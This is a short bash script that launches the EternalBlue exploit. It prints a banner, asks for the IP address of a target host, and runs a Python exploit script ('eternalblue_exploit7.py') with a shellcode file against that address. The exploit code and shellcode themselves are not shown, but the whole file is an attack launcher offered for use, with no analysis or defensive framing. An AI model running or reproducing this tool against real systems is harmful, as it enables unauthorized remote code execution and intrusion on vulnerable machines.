#!/bin/bash
echo "====================================="
echo "Eternal Blue Host exploit"
echo "===================================="
echo
read -p "IP address of Host machine:" rip
echo
echo "Remote Host set to $rip"
echo
echo "Breaking Host using Python script..."
echo
python eternalblue_exploit7.py $rip shellcode/sc_all.bin

